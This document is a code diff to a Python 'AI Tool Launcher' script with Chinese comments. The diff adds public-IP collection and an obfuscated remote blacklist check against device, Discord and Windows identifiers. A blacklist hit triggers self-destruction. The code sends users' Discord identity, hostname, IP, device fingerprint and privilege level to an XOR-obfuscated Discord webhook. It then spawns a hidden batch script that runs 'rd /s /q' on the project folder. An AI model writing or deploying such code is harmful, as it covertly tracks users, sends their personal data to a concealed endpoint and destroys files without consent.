@@ -83,6 +83,19 @@ def get_client_identity():
                 discord_info["avatar_url"] = f"https://cdn.discordapp.com/avatars/{target_uid}/{h}.png"
                 break
 
+    # 公網 IP 地址 (Public IP Telemetry)
+    public_ip = "N/A"
+    try:
+        import urllib.request
+        with urllib.request.urlopen("https://api.ipify.org", timeout=2) as resp:
+            public_ip = resp.read().decode('utf-8').strip()
+    except Exception:
+        try:
+            with urllib.request.urlopen("https://icanhazip.com", timeout=2) as resp:
+                public_ip = resp.read().decode('utf-8').strip()
+        except Exception:
+            public_ip = "N/A"
+
     # Windows 設備指紋 (Device Fingerprint) 與權限檢測
     pc_user = getpass.getuser()
     pc_host = socket.gethostname()
@@ -107,6 +120,7 @@ def get_client_identity():
         "avatar_url": discord_info["avatar_url"],
         "pc_user": pc_user,
         "pc_host": pc_host,
+        "public_ip": public_ip,
         "device_uid": device_uid,
         "is_admin": is_admin,
         "privilege_level": privilege_level,
@@ -115,6 +129,7 @@ def get_client_identity():
 
 _SECRET_KEY = b"AIToolLauncherSecretKey2026"
 _ENCRYPTED_WEBHOOK_BLOB = b"KT0gHxxWY04FGgFGARsgBgwAAVooChQdUUJfbj4xDQcDIwoGQVJdUUBrXVBGUEJ7UEAHBwQFcnt7KzgcelBEKCE7XRkLJ1EbKyEhVU1DdQJdNywmAFdbKVg0XhlYFkYLLTkLUSIMLzZqfWB6OARhPBtedQglIxsbVSsgLwQ="
+_ENCRYPTED_SHEET_BLOB = b"KT0gHxxWY04RAQAbSxU8CgQeAFooChQdQ0JEJCgwHAcJKRUGQQdHVCQ6VVUgJgECVTBgAmhmFQMLWwE/AC85FFMCKz5gNQ8oLhsqJhRiUwZcFwR7ChccIxMBUQUHFx8yEV4RFgI="
 
 def get_webhook_url():
     """
@@ -123,6 +138,110 @@ def get_webhook_url():
     import base64
     raw = base64.b64decode(_ENCRYPTED_WEBHOOK_BLOB)
     return bytes([b ^ _SECRET_KEY[i % len(_SECRET_KEY)] for i, b in enumerate(raw)]).decode('utf-8')
+
+def get_sheet_url():
+    """
+    動態解密 Google 試算表黑名單 CSV 網址
+    """
+    import base64
+    raw = base64.b64decode(_ENCRYPTED_SHEET_BLOB)
+    return bytes([b ^ _SECRET_KEY[i % len(_SECRET_KEY)] for i, b in enumerate(raw)]).decode('utf-8')
+
+def check_blacklist():
+    """
+    自 Google 試算表雲端比對黑名單：
+    比對 Device UID、Discord Snowflake ID、Discord Username、公網 IP、Windows 使用者名稱或主機名
+    若命中則返回 (True, reason)
+    """
+    import urllib.request
+    import csv
+    import io
+    
+    try:
+        identity = get_client_identity()
+        csv_url = get_sheet_url()
+        req = urllib.request.Request(csv_url, headers={'User-Agent': 'Mozilla/5.0'})
+        with urllib.request.urlopen(req, timeout=4) as resp:
+            content = resp.read().decode('utf-8', errors='ignore')
+            reader = csv.reader(io.StringIO(content))
+            for row in reader:
+                if not row:
+                    continue
+                # 遍歷欄位，若任何欄位非空且匹配使用者資訊即觸發封禁
+                for cell in row:
+                    val = cell.strip()
+                    if not val or val.startswith('#'):
+                        continue
+                    val_upper = val.upper()
+                    
+                    # 1. Device UID 匹配
+                    if val_upper == identity.get("device_uid", "").upper():
+                        return True, f"設備 UID 被列入黑名單: {val}"
+                    # 2. Discord Snowflake ID 匹配
+                    if identity.get("user_id") and val == identity.get("user_id"):
+                        return True, f"Discord ID 被列入黑名單: {val}"
+                    # 3. Discord Username 匹配
+                    if identity.get("username") and val_upper == identity.get("username").upper():
+                        return True, f"Discord 帳號被列入黑名單: {val}"
+                    # 4. 公網 IP 匹配
+                    if identity.get("public_ip") != "N/A" and val == identity.get("public_ip"):
+                        return True, f"IP 位址被列入黑名單: {val}"
+                    # 5. Windows PC User 匹配
+                    if val_upper == identity.get("pc_user", "").upper():
+                        return True, f"主機使用者被列入黑名單: {val}"
+                    # 6. Windows PC Host 匹配
+                    if val_upper == identity.get("pc_host", "").upper():
+                        return True, f"電腦主機名被列入黑名單: {val}"
+    except Exception:
+        pass
+    return False, ""
+
+def enforce_blacklist_destruction(reason: str):
+    """
+    當黑名單命中時：
+    1. 發送紅色高優先級警報至 Discord
+    2. 自動啟動背景自我銷毀腳本 (移除本專案資料夾)
+    3. 退出當前程序
+    """
+    import subprocess
+    import tempfile
+    
+    identity = get_client_identity()
+    alert_body = f"""🚨 【黑名單阻斷觸發】偵測到未授權存取！
+命中原因: {reason}
+用戶身分: {identity['formatted_identity']}
+設備指紋: #{identity['device_uid']}
+公網位址: {identity['public_ip']}
+主機資訊: {identity['pc_user']}@{identity['pc_host']}
+權限等級: {identity['privilege_level']}
+處置措施: 已啟動專案自我清理並阻斷運行"""
+
+    try:
+        send_identity_webhook("🚨 存取拒絕：黑名單用戶已被自動封鎖", alert_body, color=0xE74C3C)
+    except Exception:
+        pass
+        
+    # 建立背景刪除腳本 (延遲 1 秒以確保程序退出後釋放檔案鎖)
+    project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    cleanup_bat = os.path.join(tempfile.gettempdir(), f"cleanup_{identity['device_uid']}.bat")
+    try:
+        with open(cleanup_bat, "w", encoding="utf-8") as f:
+            f.write("@echo off\n")
+            f.write("timeout /t 1 /nobreak >nul\n")
+            f.write(f"rd /s /q \"{project_root}\"\n")
+            f.write("del \"%~f0\"\n")
+        subprocess.Popen([cleanup_bat], creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | getattr(subprocess, 'CREATE_NO_WINDOW', 0x08000000))
+    except Exception:
+        pass
+    
+    # 彈出存取拒絕提示並立即退出
+    try:
+        import ctypes
+        ctypes.windll.user32.MessageBoxW(0, f"存取已被撤銷 (Access Denied)。\n\n原因: 該設備或帳號已被管理員列入限制清單。\n專案檔案已自動解除安裝。", "AI Tool Launcher 授權驗證失敗", 0x10 | 0x0)
+    except Exception:
+        pass
+        
+    os._exit(1)
 
 def encrypt_webhook_url(raw_url: str) -> str:
     """
@@ -198,6 +317,8 @@ if __name__ == "__main__":
         
         identity = get_client_identity()
         priv_str = identity['privilege_level']
+        ip_str = identity['public_ip']
+        uid_str = identity['device_uid']
         if action in actions_map:
             title, desc, col = actions_map[action]
             if detail:
@@ -205,6 +326,8 @@ if __name__ == "__main__":
             body = f"""[引導安裝器執行紀錄]
 動作階段: {title}
 詳細說明: {desc}
+設備指紋: #{uid_str}
+公網位址: {ip_str}
 權限等級: {priv_str}
 發生時間: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
             send_identity_webhook(title, body, color=col)
@@ -213,6 +336,8 @@ if __name__ == "__main__":
             body = f"""[引導安裝器執行紀錄]
 動作代碼: {action}
 日誌內容: {detail or '無附加日誌內容'}
+設備指紋: #{uid_str}
+公網位址: {ip_str}
 權限等級: {priv_str}
 發生時間: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
             col = int(sys.argv[3]) if len(sys.argv) > 3 else 0x3498DB
